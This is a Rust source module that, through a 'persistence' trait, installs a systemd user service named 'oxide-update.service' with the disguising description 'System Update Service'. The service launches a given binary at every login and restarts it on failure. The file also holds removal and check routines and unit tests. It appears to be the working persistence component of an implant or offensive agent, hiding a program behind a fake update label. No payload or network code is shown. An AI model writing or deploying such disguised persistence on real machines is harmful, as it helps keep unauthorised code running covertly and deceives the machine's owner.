use crate::persistence::PersistenceTrait;
use std::path::Path;
use std::process::Command;

pub struct SystemdPersistence;

const SERVICE_NAME: &str = "oxide-update.service";

fn unit_dir() -> anyhow::Result<std::path::PathBuf> {
    let home = std::env::var("HOME").map_err(|_| anyhow::anyhow!("HOME not set"))?;
    Ok(std::path::PathBuf::from(home).join(".config/systemd/user"))
}

fn unit_path() -> anyhow::Result<std::path::PathBuf> {
    Ok(unit_dir()?.join(SERVICE_NAME))
}

fn unit_content(binary_path: &Path) -> String {
    format!(
        "[Unit]\nDescription=System Update Service\n\n\
         [Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n\
         [Install]\nWantedBy=default.target\n",
        binary_path.display()
    )
}

fn systemd_user_available() -> bool {
    // /run/systemd/private is the SYSTEM socket (PID 1) — not a user session indicator.
    // The user session socket is at /run/user/<uid>/systemd/private.
    let uid = nix::unistd::getuid().as_raw();
    std::path::Path::new(&format!("/run/user/{}/systemd/private", uid)).exists()
}

impl PersistenceTrait for SystemdPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        anyhow::ensure!(systemd_user_available(), "systemd user session not available");
        std::fs::create_dir_all(unit_dir()?)?;
        std::fs::write(unit_path()?, unit_content(binary_path))?;
        Command::new("systemctl").args(["--user", "daemon-reload"]).status()?;
        let s = Command::new("systemctl")
            .args(["--user", "enable", "--now", SERVICE_NAME]).status()?;
        anyhow::ensure!(s.success(), "systemctl enable failed");
        Ok(())
    }

    fn remove(&self) -> anyhow::Result<()> {
        let _ = Command::new("systemctl")
            .args(["--user", "disable", "--now", SERVICE_NAME]).status();
        if let Ok(p) = unit_path() { let _ = std::fs::remove_file(p); }
        let _ = Command::new("systemctl").args(["--user", "daemon-reload"]).status();
        Ok(())
    }

    fn check(&self) -> bool {
        unit_path().map(|p| p.exists()).unwrap_or(false)
            && Command::new("systemctl")
                .args(["--user", "is-enabled", SERVICE_NAME])
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false)
    }

    fn name(&self) -> &'static str { "systemd_user" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unit_content_has_required_sections() {
        let c = unit_content(Path::new("/home/user/.local/share/oxide/oxide-update"));
        assert!(c.contains("[Unit]") && c.contains("[Service]") && c.contains("[Install]"));
        assert!(c.contains("ExecStart=/home/user/.local/share/oxide/oxide-update"));
        assert!(c.contains("WantedBy=default.target") && c.contains("Restart=on-failure"));
    }

    #[test]
    fn service_name_constant() { assert_eq!(SERVICE_NAME, "oxide-update.service"); }
}
